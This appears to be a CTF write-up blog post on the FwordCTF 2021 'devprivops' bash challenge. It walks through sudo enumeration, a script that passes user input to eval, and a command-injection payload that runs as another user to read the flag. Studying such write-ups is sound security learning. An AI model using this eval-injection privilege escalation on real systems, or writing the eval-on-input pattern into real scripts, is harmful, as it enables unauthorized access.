---
layout: post
title: "FwordCTF 2021 - devprivops [Bash]"
categories: ctf
tags: bash privesc fqlenos
date: 2021-08-29 17:11:00 +0200
author: fqlenos
---

Devprivops is a bash challenge from FwordCTF 2021. We are given a ssh access to a machine with just two files in the home directory. The files are called: `devops.sh` and `flag.txt`, respectively.

Once logged in the machine we run `whoami` and verify that we are the `user1` user. We can see that there are three user accounts in the system:

```
user1@b7d96900911c:/home/user1$ cat /etc/passwd | grep "/bin/bash"
root:x:0:0:root:/root:/bin/bash
user1:x:1000:1000::/home/user1/:/bin/bash
user-privileged:x:1001:1001::/home/user-privileged/:/bin/bash
```

In order to escalate our privileges, we must use some privileged command. We run `sudo -l` in order to see which privileged commands we are allowed to use:

```
user1@9c82d26746f6:/home/user1$ sudo -l 
Matching Defaults entries for user1 on 9c82d26746f6:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user1 may run the following commands on 9c82d26746f6:
    (user-privileged) NOPASSWD: /home/user1/devops.sh
```

It can be noticed that our user is allowed to run `/home/user1/devops.sh` as `user-privileged` without password.

We inspect the `devops.sh` script in order to identify a vulnerability that will allow us to escalate privileges:

```bash
#!/bin/bash
PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:"
exec 2>/dev/null
name="deploy"
while [[ "$1" =~ ^- && ! "$1" == "--" ]]; do case $1 in
  -V | --version )
    echo "Beta version"
    exit
    ;;
  -d | --deploy ) 
     deploy=1
     ;;
  -p | --permission )
     permission=1
     ;;
esac; shift; done
if [[ "$1" == '--' ]]; then shift; fi

echo -ne "Welcome To Devops Swiss Knife \o/\n\nWe deploy everything for you:\n"

if [[ deploy -eq 1 ]];then
        echo -ne "Please enter your true name if you are a shinobi\n"  
        read -r name
        eval "function $name { terraform init &>/dev/null && terraform apply &>/dev/null ; echo \"It should be deployed now\"; }"
        export -f $name
fi

isAdmin=0
# Ofc only admins can deploy stuffs o//
if [[ $isAdmin -eq 1 ]];then
        $name
fi

# Check your current permissions admin-san
if [[ $permission -eq 1 ]];then
        echo "You are: " 
        id
fi
```

When running `/home/user1/devops.sh -p` the user remains the same:

```
user1@8deb9deda02f:/home/user1$ /home/user1/devops.sh -p
Welcome To Devops Swiss Knife \o/

We deploy everything for you:
You are: 
uid=1000(user1) gid=1000(user1) groups=1000(user1)
```

Keeping in mind that the previous script is runnable as `user-privileged`:

```
user1@8deb9deda02f:/home/user1$ sudo -u user-privileged /home/user1/devops.sh -p
Welcome To Devops Swiss Knife \o/

We deploy everything for you:
You are: 
uid=1001(user-privileged) gid=1001(user-privileged) groups=1001(user-privileged)
```

This means that we can impersonate the `user-privileged` user from `user1` with `devops.sh`.

We can exploit the script injecting code by running: `sudo -u user-privileged /home/user1/devops.sh -d`. The deploy argument (`-d`) of the script reads our input into the `$name` variable, and places it in an eval statement. Therefore, we can add the following payload: `a { echo 1; }; cat flag.txt; function b`, as it is shown below:

```
user1@09b79a8590f9:/home/user1$ sudo -u user-privileged /home/user1/devops.sh -d
Welcome To Devops Swiss Knife \o/

We deploy everything for you:
Please enter your true name if you are a shinobi
a { echo 1; }; cat flag.txt; function b
FwordCTF{W00w_KuR0ko_T0ld_M3_th4t_Th1s_1s_M1sdirecti0n_BasK3t_FTW}
```
